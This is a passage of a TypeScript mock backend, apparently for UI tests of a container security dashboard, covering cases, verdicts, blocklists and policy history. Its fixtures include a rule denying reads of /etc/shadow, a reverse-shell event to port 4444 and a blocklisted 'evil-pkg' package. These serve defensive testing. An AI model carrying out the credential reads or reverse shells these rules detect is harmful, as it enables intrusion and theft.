        .filter((s) => (!q.get('status') || s.status === q.get('status')) && (!q.get('manager') || s.manager === q.get('manager')))
        .map((s) => {
          const violationCount = (s.violations ?? []).reduce((n, v) => n + v.count, 0);
          if (!this.listOmitsDetail) return { ...s, violationCount };
          const { violations: _v, activity: _a, ...rest } = s;
          void _v;
          void _a;
          return { ...rest, violationCount };
        });
      return json(rows.slice(0, Math.min(500, Number(q.get('limit') ?? 50))));
    }
    if (method === 'GET' && (m = path.match(/^\/installs\/([^/]+)$/))) {
      const s = this.installs.find((x) => x.id === decodeURIComponent(m![1]));
      return s ? json(s) : fail(404, '세션 없음');
    }

    // 건 · 판정
    if (method === 'GET' && path === '/cases') {
      return json(this.cases.filter((c) => (!q.get('state') || c.state === q.get('state')) && (!q.get('source') || c.source === q.get('source'))));
    }
    if (method === 'GET' && (m = path.match(/^\/cases\/([^/]+)$/))) {
      const c = this.cases.find((x) => x.id === m![1]);
      return c ? json(c) : fail(404, '건 없음');
    }
    if (method === 'POST' && (m = path.match(/^\/cases\/([^/]+)\/decide$/))) {
      const c = this.cases.find((x) => x.id === m![1]);
      if (!c) return fail(404, '건 없음');
      if (c.decision !== 'pending') return fail(409, '이미 판정된 건');
      const { decision, note } = JSON.parse(body ?? '{}') as { decision: 'malicious' | 'false_positive'; note?: string };
      const { changes, notes } = this.proposalChanges(c, decision);
      const p: Proposal = { id: `prop-${String(++this.seq).padStart(4, '0')}`, caseId: c.id, decision, state: 'draft', createdAt: new Date().toISOString(), createdBy: this.auth.actorName(), appliedAt: null, appliedBy: null, changes, notes };
      this.proposals.unshift(p);
      Object.assign(c, { decision, note: note ?? '', state: 'decided', decidedAt: new Date().toISOString(), decidedBy: this.auth.actorName(), proposalId: p.id });
      this.send({ type: 'case', data: { ...c } });
      return json({ case: c, proposal: p });
    }
    // W18: 판정 미리보기(백엔드 review/decision_preview.go 계약, 간이) — 저장 없음
    if (method === 'POST' && (m = path.match(/^\/cases\/([^/]+)\/preview$/))) {
      const c = this.cases.find((x) => x.id === m![1]);
      if (!c) return fail(404, '건 없음');
      if (c.decision !== 'pending') return fail(409, '이미 판정된 건');
      const { decision } = JSON.parse(body ?? '{}') as { decision: 'malicious' | 'false_positive' };
      if (decision !== 'malicious' && decision !== 'false_positive') return fail(400, 'decision: malicious | false_positive');
      return json(this.decisionPreview(c, decision));
    }
    // W18: 새 기본 규칙 · 증거
    if (method === 'GET' && path === '/policies/defaults') return json(this.policyDefaults);
    if (method === 'GET' && path === '/evidence') {
      const k = q.get('container') ?? '';
      if (!k) return fail(400, 'container 가 필요합니다');
      return json(this.evidence.filter((e) => e.containerName === k || e.containerId.startsWith(k)).sort((a, b) => b.collectedAt.localeCompare(a.collectedAt)));
    }

    // 제안
    if (method === 'GET' && path === '/proposals') return json(this.proposals.filter((p) => !q.get('state') || p.state === q.get('state')));
    if (method === 'POST' && (m = path.match(/^\/proposals\/([^/]+)\/(preview|apply|discard)$/))) {
      const p = this.proposals.find((x) => x.id === m![1]);
      if (!p) return fail(404, '제안 없음');
      if (m[2] === 'preview') return json(this.preview(p));
      if (p.state !== 'draft') return fail(409, '초안이 아닌 제안');
      const c = this.case(p.caseId);
      const at = new Date().toISOString();
      const reason = ((JSON.parse(body || '{}') as { reason?: string }).reason ?? '').trim(); // W15 · W18: 사유 → 변경 이력
      if (m[2] === 'apply') {
        // 11/09: 예외를 더한 규칙 + 도메인을 새로 막았으면 blocklist-hosts(backend review/proposals.go ruleIds)
        const ids = new Set<string>();
        const before: Record<string, Rule> = {};
        for (const ch of p.changes) {
          if (ch.op === 'block') {
            this.blocklist[ch.list].unshift({ value: ch.value, caseId: c.id, at, by: this.auth.actorName() });
            if (ch.list === 'hosts') ids.add('blocklist-hosts');
          } else {
            const r = this.rules.find((x) => x.id === ch.ruleId)!;
            if (!ids.has(r.id)) before[r.id] = clone(r);
            ids.add(r.id);
            const key = ch.field as keyof Rule;
            (r[key] as unknown as string[]) = [...((r[key] as unknown as string[]) ?? []), ch.value];
          }
        }
        const after = Object.fromEntries(Object.keys(before).map((id) => [id, clone(this.rules.find((x) => x.id === id)!)]));
        Object.assign(p, { state: 'applied', appliedAt: at, appliedBy: this.auth.actorName() });
        this.addChange('proposal_applied', this.changeSummary(p), c.id, p.id, reason, { ruleIds: [...ids].sort(), ...(Object.keys(before).length ? { before, after } : {}) });
      } else {
        Object.assign(p, { state: 'discarded' });
        this.addChange('proposal_discarded', '제안 버림(변경 없이 건 종결)', c.id, p.id, reason);
      }
      Object.assign(c, { state: 'closed', closedAt: at });
      this.send({ type: 'case', data: { ...c } });
      return json(p);
    }

    // 차단 목록 · 변경 이력 · OSV
    if (method === 'GET' && path === '/blocklist') return json(this.blocklist);
    if (method === 'DELETE' && (m = path.match(/^\/blocklist\/(packages|images|hosts)\/(.+)$/))) {
      const list = m[1] as BlockList;
      const value = decodeURIComponent(m[2]);
      this.blocklist[list] = this.blocklist[list].filter((e) => e.value !== value);
      this.addChange('blocklist_remove', `${value} 차단 해제`, null, null, ((JSON.parse(body || '{}') as { reason?: string }).reason ?? '').trim(), list === 'hosts' ? { ruleIds: ['blocklist-hosts'] } : {});
      return route.fulfill({ status: 204 });
    }
    // 11/09: rule · kind 거르기 · offset 쪽 번호({items, total, offset, limit}) — rule 로 거르면 전후 값도 그 정책 것만(backend review.QueryChanges)
    if (method === 'GET' && path === '/changes') {
      const rule = q.get('rule') ?? '';
      const kind = q.get('kind') ?? '';
      const rows = this.changes
        .filter((c) => (!rule || (c.ruleIds ?? []).includes(rule)) && (!kind || c.kind === kind))
        .map((c) => {
          const out: Change = { ...c, ruleIds: c.ruleIds ?? [] };
          if (rule) {
            const pick = (x?: Record<string, Rule>) => (x && x[rule] ? { [rule]: x[rule] } : undefined);
            out.before = pick(c.before);
            out.after = pick(c.after);
            if (!out.before) delete out.before;
            if (!out.after) delete out.after;
          }
          return out;
        });
      if (!q.has('offset')) return json(rows.slice(0, Number(q.get('limit') ?? 100)));
      const limit = Math.min(500, Number(q.get('limit') ?? 50) || 50);
      const offset = Number(q.get('offset'));
      return json({ items: rows.slice(offset, offset + limit), total: rows.length, offset, limit } satisfies ChangesPage);
    }
    if (method === 'GET' && path === '/osv') {
      const eco = q.get('ecosystem') ?? '';
      const name = q.get('name') ?? '';
      const r: OsvResult = this.osvFail
        ? { ecosystem: eco, name, vulns: 0, ids: [], queriedAt: new Date().toISOString(), source: 'osv.dev', error: 'osv.dev 시간 초과(5초)' }
        : { ecosystem: eco, name, vulns: this.osv[`${eco}:${name}`] ?? 0, ids: Array.from({ length: Math.min(3, this.osv[`${eco}:${name}`] ?? 0) }, (_, i) => `PYSEC-2023-${74 + i}`), queriedAt: new Date().toISOString(), source: 'osv.dev', error: null };
      return json(r);
    }
    if (method === 'POST' && path === '/chat') {
      if (!this.info.chat) return route.fulfill({ status: 404, contentType: 'text/plain', body: '404 page not found' });
      const r = this.chatReply ?? {};
      if (r.status && r.status !== 200) return fail(r.status, r.error ?? '오류');
      return route.fulfill({ status: 200, contentType: 'text/event-stream; charset=utf-8', body: sseBody(r.events ?? this.chatPending()) });
    }
    return route.fulfill({ status: 404, contentType: 'text/plain', body: '404 page not found' });
  }

  // 기본 답: 판정 대기 요약 — token 조각 → facts → links → done
  chatPending(): [string, unknown][] {
    const open = this.cases.filter((c) => c.state === 'open');
    return [
      ['token', `판정 대기 건이 `],
      ['token', `${open.length}개 있습니다. `],
      ['token', '각 건을 열어 판정하세요.'],
      ['facts', { intent: 'pending', tool: 'pending_cases', status: `판정 대기 ${open.length}건`, sentences: open.map((c) => `${c.label} 은 판정 대기입니다.`), cases: [] }],
      ['links', [{ label: '감사 로그(판정 · 변경 이력)', href: '/audit?view=changes' }]],
      ['done', {}],
    ];
  }

  // 10/16: 공급망 검사 「차단 목록에 올리기」로 연 건(source scan). decided 면 악성 판정 + 초안 제안까지
  scanCase(o: { decided?: boolean } = {}): { c: Case; p: Proposal | null } {
    const n = ++this.seq;
    const id = `case-${String(n).padStart(4, '0')}`;
    const at = new Date().toISOString();
    const c: Case = {
      id, source: 'scan', installId: null, scanId: 'scan-0007', container: '', label: 'pip evil-pkg 0.1.0', image: '', package: 'pip:evil-pkg',
      openedAt: at, level: 'held', violations: 1, ruleIds: ['supply-chain-scan'], state: 'open', decision: 'pending',
      decidedAt: null, decidedBy: null, note: '', proposalId: null, closedAt: null,
    };
    let p: Proposal | null = null;
    if (o.decided) {
      p = { id: `prop-${String(++this.seq).padStart(4, '0')}`, caseId: id, decision: 'malicious', state: 'draft', createdAt: at, createdBy: ACTOR, appliedAt: null, appliedBy: null, changes: [{ op: 'block', list: 'packages', value: 'pip:evil-pkg' }], notes: [] };
      this.proposals.unshift(p);
      Object.assign(c, { decision: 'malicious', state: 'decided', decidedAt: at, decidedBy: ACTOR, note: '공급망 검사 scan-0007', proposalId: p.id });
    }
    this.cases.unshift(c);
    return { c, p };
  }

  summaryRanges: Record<string, [number, number]> = { '1h': [60, 60], '24h': [24, 3600], '7d': [28, 21600] };
  // R2 11/04: previous — 바로 앞 같은 길이 기간(백엔드 internal/summary 와 같은 규칙: 경계는 지금 기간 쪽, 기록이 하나도 없으면 null).
  //   테스트가 값을 정하려면 summaryPrevious 에 객체 · null 을 넣는다(undefined 면 계산, 'omit' 이면 옛 백엔드처럼 키 없음)
  summaryPrevious: Summary['previous'] | 'omit' | undefined = undefined;
  summary(range: string): Summary {
    const cur = this.summaryWindow(range, 0);
    if (this.summaryPrevious === 'omit') {
      const { previous: _p, ...old } = cur.s;
      void _p;
      return old;
    }
    if (this.summaryPrevious !== undefined) return { ...cur.s, previous: this.summaryPrevious };
    const p = this.summaryWindow(range, 1);
    return {
      ...cur.s,
      previous: p.has
        ? { collected: p.s.collected.total, violations: p.s.violations.total, isolatedContainers: p.s.isolatedContainers, installs: p.s.installs.total, decided: p.s.decisions.malicious + p.s.decisions.falsePositive, isolationMedianMs: p.s.isolation?.medianMs ?? null }
        : null,
    };
  }
  private summaryWindow(range: string, shift: number): { s: Summary; has: boolean } {
    const [n, step] = this.summaryRanges[range] ?? [24, 3600];
    const stepMs = step * 1000;
    const end = Math.floor(Date.now() / stepMs) * stepMs + stepMs - shift * n * stepMs;
    const from = end - n * stepMs;
    let rows = 0;
    // 10/30: dns 는 enableDns() 일 때만(옛 백엔드처럼 키 자체가 없는 응답도 화면이 받아야 한다)
    const series: Summary['series'] = Array.from({ length: n }, (_, i) => ({ t: new Date(from + i * stepMs).toISOString(), exec: 0, open: 0, connect: 0, ...(this.dnsCollected ? { dns: 0 } : {}), killed: 0, alert: 0 }));
    const at = (ms: number) => (ms >= from && ms < end ? series[Math.floor((ms - from) / stepMs)] : undefined);
    const byKind: Summary['collected']['byKind'] = { exec: 0, open: 0, connect: 0, ...(this.dnsCollected ? { dns: 0 } : {}) };
    const kinds = this.dnsCollected ? (['exec', 'open', 'connect', 'dns'] as const) : (['exec', 'open', 'connect'] as const);
    for (const c of this.collected) {
      const b = at(c.minute * 60000);
      if (!b) continue;
      rows++;
      for (const k of kinds) {
        b[k] = (b[k] ?? 0) + (c[k] ?? 0);
        byKind[k] = (byKind[k] ?? 0) + (c[k] ?? 0);
      }
    }
    // 격리 지연(계약 §3): 범위 안 killedAt 있는 행, ms = killedAt − detectedAt
    const lat = this.audit
      .filter((a) => a.timeline?.killedAt && Date.parse(a.event.timestamp) >= from && Date.parse(a.event.timestamp) < end)
      .map((a) => Date.parse(a.timeline!.killedAt!) - Date.parse(a.timeline!.detectedAt))
      .sort((x, y) => x - y);
    const q = (p: number) => (lat.length ? lat[Math.min(lat.length - 1, Math.floor(p * lat.length))] : null);
    const isolation = { count: lat.length, medianMs: lat.length ? lat[Math.floor((lat.length - 1) / 2)] : null, p95Ms: q(0.95), maxMs: lat.length ? lat[lat.length - 1] : null };
    const vio = { total: 0, killed: 0, alert: 0, held: 0 };
    const isolated = new Set<string>();
    const tops = { rules: new Map<string, { count: number; level: Level }>(), ctrs: new Map<string, { count: number; level: Level }>() };
    const rank: Record<Level, number> = { normal: 0, alert: 1, held: 2, killed: 3 };
    const bump = (m: Map<string, { count: number; level: Level }>, k: string, l: Level) => {
      const x = m.get(k) ?? { count: 0, level: l };
      x.count++;
      if (rank[l] > rank[x.level]) x.level = l;
      m.set(k, x);
    };
    for (const a of this.audit) {
      const ms = Date.parse(a.event.timestamp);
      if (ms < from || ms >= end) continue;
      const l = levelOf(a);
      vio.total++;
      if (l === 'killed') {
        vio.killed++;
        isolated.add(a.event.containerName);
      } else if (l === 'held') vio.held++;
      else vio.alert++;
      const b = at(ms);
      if (b) b[l === 'killed' || l === 'held' ? 'killed' : 'alert']++;
      if (a.ruleId) bump(tops.rules, a.ruleId, l);
      bump(tops.ctrs, a.install?.label ?? a.event.containerName, l);
    }
    const sorted = (m: Map<string, { count: number; level: Level }>) => [...m.entries()].sort((x, y) => y[1].count - x[1].count || x[0].localeCompare(y[0])).slice(0, 10);
    const ins = this.installs.filter((s) => Date.parse(s.startedAt) >= from && Date.parse(s.startedAt) < end);
    const st = (k: string) => ins.filter((s) => s.status === k).length;
    const dec = this.cases.filter((c) => c.decidedAt && Date.parse(c.decidedAt) >= from && Date.parse(c.decidedAt) < end);
    const has = rows > 0 || vio.total > 0 || ins.length > 0 || dec.length > 0;
    const s: Summary = {
      range: this.summaryRanges[range] ? range : '24h',
      from: new Date(from).toISOString(),
      to: new Date(end).toISOString(),
      bucketSec: step,
      collected: { total: byKind.exec + byKind.open + byKind.connect + (byKind.dns ?? 0), byKind },
      violations: vio,
      isolatedContainers: isolated.size,
      series,
      topRules: sorted(tops.rules).map(([ruleId, v]) => ({ ruleId, ...v })),
      topContainers: sorted(tops.ctrs).map(([container, v]) => ({ container, ...v })),
      installs: { total: ins.length, passed: st('passed'), isolated: st('isolated'), warned: st('warned'), refused: st('refused'), failed: st('failed') + st('unknown'), running: st('running') },
      decisions: { malicious: dec.filter((c) => c.decision === 'malicious').length, falsePositive: dec.filter((c) => c.decision === 'false_positive').length, pending: this.cases.filter((c) => c.state === 'open').length },
      blocklist: { packages: this.blocklist.packages.length, images: this.blocklist.images.length, hosts: this.blocklist.hosts.length },
      isolation,
      previous: null,
    };
    return { s, has };
  }

  private addChange(kind: Change['kind'], summary: string, caseId: string | null = null, proposalId: string | null = null, reason = '', extra: Pick<Change, 'ruleIds' | 'before' | 'after' | 'revertOf'> = {}) {
    const x = Object.fromEntries(Object.entries(extra).filter(([, v]) => v !== undefined));
    this.changes.unshift({ id: `chg-${String(++this.seq).padStart(4, '0')}`, at: new Date().toISOString(), by: this.auth.actorName(), kind, caseId, proposalId, summary, reason, ...x });
  }

  // 정책 API 응답(11/09 backend api.policyView): 그 정책을 다룬 마지막 변경 기록의 시각 · 처리자. 기록이 없으면 키 없음
  view(r: Rule): PolicyView {
    const last = this.changes.find((c) => (c.ruleIds ?? []).includes(r.id));
    return last ? { ...r, updatedAt: last.at, updatedBy: last.by } : { ...r };
  }

  // 11/09 정책 이력 시나리오: sensitive-files 를 만들고(경고 · 경로 1개) → 격리 · 경로 3개로(지금 값), egress-allowlist 예외 추가, 시연 실행.
  // 시각은 3시간 · 2시간 · 1시간 · 30분 전. 반환 = 만든 변경 id(오래된 순)
  seedPolicyHistory(): string[] {
    const now = Date.now();
    const sf = clone(this.rules.find((r) => r.id === 'sensitive-files')!);
    const eg = clone(this.rules.find((r) => r.id === 'egress-allowlist')!);
    const at = (min: number) => new Date(now - min * 60_000).toISOString();
    const mk = (n: number, min: number, kind: string, summary: string, extra: Partial<Change>): Change => ({ id: `chg-${String(n).padStart(4, '0')}`, at: at(min), by: ACTOR, kind, caseId: null, proposalId: null, summary, reason: '', ...extra });
    const alertSf: Rule = { ...clone(sf), action: 'alert', denyPaths: ['/etc/shadow'] };
    const egBefore: Rule = { ...clone(eg), allowCidrs: ['10.0.0.0/8'] };
    eg.allowCidrs = ['10.0.0.0/8', '140.82.112.3/32'];
    this.rules = this.rules.map((r) => (r.id === 'egress-allowlist' ? clone(eg) : r));
    const rows: Change[] = [
      mk(11, 180, 'policy_edit', '정책 sensitive-files 저장', { ruleIds: ['sensitive-files'], after: { 'sensitive-files': clone(alertSf) } }),
      mk(12, 120, 'policy_edit', '정책 sensitive-files 저장', { ruleIds: ['sensitive-files'], before: { 'sensitive-files': clone(alertSf) }, after: { 'sensitive-files': clone(sf) }, reason: '격리로 올림' }),
      mk(13, 60, 'proposal_applied', '예외 1개 추가(egress-allowlist)', { ruleIds: ['egress-allowlist'], before: { 'egress-allowlist': egBefore }, after: { 'egress-allowlist': clone(eg) }, caseId: 'case-0003' }),
      mk(14, 30, 'demo_run', '시연 실행: shell', { ruleIds: [] }),
    ];
    this.changes = [...rows, ...this.changes].sort((a, b) => b.at.localeCompare(a.at));
    return rows.map((r) => r.id);
  }

  // W18: 판정 미리보기 effects — 백엔드와 같은 kind(blocklist · already_blocked · package · image · host · exception · none · note · next)
  private decisionPreview(c: Case, decision: 'malicious' | 'false_positive'): DecisionPreview {
    const { changes, notes } = this.proposalChanges(c, decision);
    const label = { packages: '패키지', images: '이미지', hosts: '도메인' } as const;
    const effects: DecisionEffect[] = [];
    if (decision === 'malicious') {
      const blocks = changes.filter((x): x is Extract<ProposalChange, { op: 'block' }> => x.op === 'block');
      const fresh = blocks.filter((x) => !this.blocklist[x.list].some((e) => e.value === x.value));
      const already = blocks.filter((x) => !fresh.includes(x));
      if (fresh.length) {
        const by = (['packages', 'images', 'hosts'] as const).filter((l) => fresh.some((x) => x.list === l)).map((l) => `${label[l]} ${fresh.filter((x) => x.list === l).length}`);
        effects.push({ kind: 'blocklist', count: fresh.length, text: `차단 목록 +${fresh.length} (${by.join(' · ')})` });
      }
      if (already.length) effects.push({ kind: 'already_blocked', count: already.length, text: `이미 차단 목록에 있는 ${already.length}개(${already.map((x) => `${label[x.list]} ${x.value}`).join(', ')})는 그대로 둡니다` });
      if (!fresh.length) effects.push({ kind: 'none', text: '새로 차단할 대상이 없습니다. 적용하면 건만 종결합니다' });
      for (const x of fresh) {
        if (x.list === 'packages') effects.push({ kind: 'package', text: `다음 sg-install 부터 ${x.value} 는 설치 전에 거부됩니다(컨테이너를 띄우지 않음)` });
        if (x.list === 'images') effects.push({ kind: 'image', count: 1, text: `같은 이미지(${x.value})를 쓰는 실행 중 컨테이너 1개, 적용하면 다음 시작 때 격리됩니다(지금 실행은 그대로)` });
      }
      const hosts = fresh.filter((x) => x.list === 'hosts').map((x) => x.value);
      if (hosts.length) effects.push({ kind: 'host', count: hosts.length, text: `도메인 ${hosts.length}개(${hosts.join(', ')})는 적용 즉시 시스템 규칙 blocklist-hosts 로 차단됩니다(런타임 · 설치 모두)` });
    } else {
      const ex = changes.filter((x): x is Extract<ProposalChange, { op: 'except' }> => x.op === 'except');
      for (const x of ex) {
        const r = this.rules.find((y) => y.id === x.ruleId);
        effects.push({ kind: 'exception', text: `규칙 ${x.ruleId} 예외 추가(${x.field} 에 ${x.value}, 범위: ${r?.containers?.length ? `컨테이너 ${r.containers.join(', ')}` : '모든 컨테이너'}). 적용 즉시 엔진에 반영됩니다` });
      }
      if (!ex.length) effects.push({ kind: 'none', text: '자동으로 만들 예외가 없습니다. 정책 탭에서 직접 고칩니다' });
    }
    for (const n of notes) effects.push({ kind: 'note', text: n });
    effects.push({ kind: 'next', text: '판정하면 제안 초안이 생깁니다. 아직 아무것도 바뀌지 않으며, 정책 화면에서 미리보기 후 적용합니다' });
    return { caseId: c.id, decision, changes, notes, effects };
  }

  private changeSummary(p: Proposal) {
    return p.changes
      .map((c) => (c.op === 'block' ? `${{ packages: '패키지', images: '이미지', hosts: '도메인' }[c.list]} ${c.value} 차단` : `${c.ruleId} 예외 ${c.value}`))
      .join(' · ');
  }

  // 계약 「판정 → 제안 만들기」 표 — 백엔드 review/cases.go 와 같은 규칙(2026-10-15 결정 반영)
  private proposalChanges(c: Case, decision: 'malicious' | 'false_positive'): { changes: ProposalChange[]; notes: string[] } {
    const vs = c.source === 'install' ? (this.installs.find((s) => s.id === c.installId)?.violations ?? []) : this.audit.filter((a) => a.caseId === c.id);
    const out: ProposalChange[] = [];
    const notes: string[] = [];
    const add = (x: ProposalChange) => {
      if (!out.some((o) => JSON.stringify(o) === JSON.stringify(x))) out.push(x);
    };
    const note = (n: string) => !notes.includes(n) && notes.push(n);
    const hostMatches = (pat: string, host: string) => host === pat || host.endsWith(`.${pat.replace(/^\*\./, '')}`);
    if (decision === 'malicious') {
      if (c.source === 'install' || c.source === 'scan') add({ op: 'block', list: 'packages', value: c.package! });
      else add({ op: 'block', list: 'images', value: c.image });
      for (const v of vs) {
        // 10/30: dns 질의도 질의 이름(dstHost)을 도메인 차단 후보로
        const host = v.event.kind === 'connect' || v.event.kind === 'dns' ? v.event.dstHost : undefined;
        if (v.event.kind !== 'connect' && v.event.kind !== 'dns') continue;
        if (!host) {
          note(`${v.event.dstIp} 은 도메인을 몰라 도메인 차단을 만들지 않았습니다`);
          continue;
        }
        // 어느 규칙의 allowHosts 에 있는 도메인은 막지 않는다
        const by = this.rules.find((r) => (r.allowHosts ?? []).some((h) => hostMatches(h, host)));
        if (by) note(`도메인 ${host} 은 규칙 ${by.id} 의 허용 도메인이라 차단하지 않았습니다`);
        else add({ op: 'block', list: 'hosts', value: host });
      }
    } else {
      const hadHosts = new Set(this.rules.filter((r) => r.allowHosts?.length).map((r) => r.id));
      for (const v of vs) {
        if (!v.ruleId) continue;
        const rule = this.rules.find((r) => r.id === v.ruleId);
        if (v.ruleId === 'blocked-image') note('이미지 차단은 예외가 아니라 차단 목록에서 해제합니다');
        else if (rule?.kind === 'exec') note(`실행 규칙 ${v.ruleId} 은 자동 예외를 만들지 않습니다. 정책 탭에서 직접 수정하세요`);
        // 엔진은 금지 목록(denyPorts · denyHosts)을 허용 목록보다 먼저 본다 — 예외로 풀 수 없으면 안내만
        else if (v.event.kind === 'connect' && (rule?.denyPorts?.includes(v.event.dstPort ?? -1) || rule?.denyHosts?.some((h) => v.event.dstHost && hostMatches(h, v.event.dstHost))))
          note(`규칙 ${v.ruleId} 은 금지 목록에 걸려 예외로 풀 수 없습니다. 정책 탭에서 직접 수정하세요`);
        else if (v.event.kind === 'open' && v.event.path) add({ op: 'except', ruleId: v.ruleId, field: 'allowPaths', value: v.event.path });
        // 10/30: dns 규칙은 허용 도메인 목록이 있을 때만 예외(없는 규칙에 첫 allowHosts 를 넣으면 허용 목록 모드로 바뀐다)
        else if (v.event.kind === 'dns' && v.event.dstHost && hadHosts.has(v.ruleId)) add({ op: 'except', ruleId: v.ruleId, field: 'allowHosts', value: v.event.dstHost });
        else if (v.event.kind === 'dns') note(`dns 규칙 ${v.ruleId} 은 허용 목록이 없어 자동 예외를 만들지 않습니다(allowHosts 를 넣으면 그 밖의 도메인 질의가 모두 위반이 됩니다). 정책 탭에서 직접 수정하세요`);
        else if (v.event.kind === 'connect' && v.event.dstHost && hadHosts.has(v.ruleId)) add({ op: 'except', ruleId: v.ruleId, field: 'allowHosts', value: v.event.dstHost });
        else if (v.event.kind === 'connect') add({ op: 'except', ruleId: v.ruleId, field: 'allowCidrs', value: `${v.event.dstIp}/32` });
      }
    }
    return { changes: out, notes };
  }

  // 런타임: 컨테이너가 다시 떴는데 이미지가 차단 목록에 있으면 시작 즉시 격리(blocked-image) — 새 건은 열지 않는다
  runtimeKill(container: string, image: string) {
    const b = this.blocklist.images.find((e) => e.value === image);
    if (!b) throw new Error(`차단 목록에 없는 이미지 ${image}`);
    const v: Verdict = { ...kill(ev(Date.now(), 0, container, image, { kind: 'exec', comm: 'python' }), 'blocked-image', `차단된 이미지 ${image}`) };
    this.recent.unshift(v);
    this.audit.unshift({ ...v, id: Math.max(0, ...this.audit.map((a) => a.id)) + 1, caseId: b.caseId ?? null, install: null });
    this.send({ type: 'verdict', data: v });
  }

  private preview(p: Proposal): Preview {
    const changed: Preview['changed'] = [];
    for (const a of this.audit) {
      const before = levelOf(a);
      for (const ch of p.changes) {
        if (ch.op === 'except' && a.ruleId === ch.ruleId && (a.event.dstHost === ch.value || a.event.path === ch.value || `${a.event.dstIp}/32` === ch.value)) {
          changed.push({ auditId: a.id, before, after: 'normal', container: a.event.containerName, ruleId: a.ruleId! });
        }
        if (ch.op === 'block' && ch.list === 'hosts' && a.event.dstHost === ch.value && before !== 'killed') {
          changed.push({ auditId: a.id, before, after: 'killed', container: a.event.containerName, ruleId: 'blocklist-hosts' });
        }
      }
    }
    const nextOnly = p.changes.flatMap((ch) => (ch.op === 'block' && ch.list !== 'hosts' ? [{ list: ch.list, value: ch.value }] : []));
    return { evaluated: this.audit.length, changed, nextOnly, counts: { toNormal: changed.filter((c) => c.after === 'normal').length, toBlocked: changed.filter((c) => c.after !== 'normal').length } };
  }
}

// WS 로 보낼 격리 판정(같은 컨테이너 연속 격리 → 토스트 묶음 확인용)
export function killedVerdict(container: string, reason = '리버스 셸 포트 4444'): Verdict {
  return kill(ev(Date.now(), 0, container, 'demo/x:1', { kind: 'connect', comm: 'sh', dstIp: '203.0.113.7', dstPort: 4444 }), 'reverse-shell-ports', reason);
}
export function normalVerdict(container: string, path: string): Verdict {
  return ok(ev(Date.now(), 0, container, 'demo/x:1', { kind: 'open', comm: 'python', path }));
}

// R3 11/04: backend demo/explain.go condition() 과 같은 조건 요약 문구
const PRIVATE = /^(10\.|127\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/;
export function ruleCondition(st: Omit<Rule, 'id' | 'action'> & { kind: Rule['kind'] }): string {
  const j = (xs?: (string | number)[]) => (xs ?? []).join(' · ');
  const parts: string[] = [];
  const add = (ok: boolean, t: string) => ok && parts.push(t);
  switch (st.kind) {
    case 'exec':
      add(!!st.denyComms?.length, `프로세스 ${j(st.denyComms)}`);
      add(!!st.denyArgs?.length, `인자 ${j(st.denyArgs)}`);
      break;
    case 'open':
      add(!!st.denyPaths?.length, `경로 ${j(st.denyPaths)}`);
      add(!!st.allowPaths?.length, `예외 ${j(st.allowPaths)}`);
      break;
    case 'connect': {
      add(!!st.denyPorts?.length, `포트 ${j(st.denyPorts)}`);
      add(!!st.denyCidrs?.length, `대역 ${j(st.denyCidrs)}`);
      add(!!st.denyHosts?.length, `도메인 ${j(st.denyHosts)}`);
      const allow = [...(st.allowPorts?.length ? [`포트 ${j(st.allowPorts)}`] : []), ...(st.allowHosts?.length ? [j(st.allowHosts)] : [])];
      if (st.allowCidrs?.length && !allow.length) parts.push(`내부망(${j(st.allowCidrs)}) 밖 연결`);
      else if (st.allowCidrs?.length || allow.length) parts.push(`허용(${[...(st.allowCidrs ?? []), ...allow].join(' · ')}) 밖 연결`);
      add(!!st.directIp, `도메인 조회 없는 IP 직접 연결(${st.directIp})`);
      break;
    }
    case 'dns':
      add(!!st.denyHosts?.length, `질의 ${j(st.denyHosts)}`);
      add(!!st.denyQtypes?.length, `질의 유형 ${j(st.denyQtypes)}`);
      add(!!st.maxLabelLength, `라벨 ${st.maxLabelLength}자 초과`);
      add(!!st.maxNameLength, `이름 ${st.maxNameLength}자 초과`);
      add(!!st.allowHosts?.length, `허용(${j(st.allowHosts)}) 밖 질의`);
      break;
    case 'sequence':
      return `${st.windowSeconds ?? 0}초 안: ${(st.steps ?? []).map((x) => ruleCondition(x)).join(' → ')}`;
  }
  return parts.join(' / ');
}
const eventDetail = (e: Event) =>
  e.kind === 'exec' ? e.args || e.comm : e.kind === 'open' ? (e.path ?? '') : e.kind === 'dns' ? `${e.dstHost ?? ''} (${e.qtype ?? ''})` : e.dstHost ? `${e.dstIp}:${e.dstPort} (${e.dstHost})` : `${e.dstIp}:${e.dstPort}`;
// 연쇄 단계 조건(간이) — exec 프로세스 · 인자, open 경로 앞부분, connect 내부망 밖 · 금지 포트
function stepMatches(st: NonNullable<Rule['steps']>[number] | undefined, e: Event): boolean {
  if (!st || st.kind !== e.kind) return false;
  if (e.kind === 'exec') return !!st.denyComms?.includes(e.comm) || !!st.denyArgs?.some((a) => (e.args ?? '').includes(a));
  if (e.kind === 'open') return !!st.denyPaths?.some((p) => (e.path ?? '').startsWith(p.replace(/\*.*$/, '')));
  if (e.kind === 'connect') return !!st.denyPorts?.includes(e.dstPort ?? 0) || (!!st.allowCidrs?.length && !PRIVATE.test(e.dstIp ?? ''));
  return false;
}
